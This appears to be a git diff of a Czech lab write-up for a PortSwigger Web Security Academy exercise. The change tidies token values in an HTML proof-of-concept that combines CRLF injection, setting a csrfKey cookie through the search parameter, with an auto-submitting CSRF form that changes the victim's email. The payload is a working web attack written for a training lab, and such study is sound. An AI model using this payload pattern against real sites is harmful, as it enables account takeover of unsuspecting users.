@@ -65,9 +65,9 @@ Pomocí zranitelnosti **CRLF Injection / Cookie Injection** ve vyhledávacím po
     <script>history.pushState('', '', '/')</script>
     <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
         <input type="hidden" name="email" value="mary@google.com" />
-        <input type="hidden" name="csrf" value="<K0RGrQ7Tc9RV9IaJaCXxYDKPKwUV1tuY>" />
+        <input type="hidden" name="csrf" value="K0RGrQ7Tc9RV9IaJaCXxYDKPKwUV1tuY" />
     </form>
-    <img src="https://<LAB-ID>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=<0XB3Y3eeEU7xqwECLoyqtCrdRHv6AgwS>%3b%20SameSite=None" onerror="document.forms[0].submit();" />
+    <img src="https://<LAB-ID>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=0XB3Y3eeEU7xqwECLoyqtCrdRHv6AgwS%3b%20SameSite=None" onerror="document.forms[0].submit();" />
     <script>
         document.forms[0].submit();
     </script>
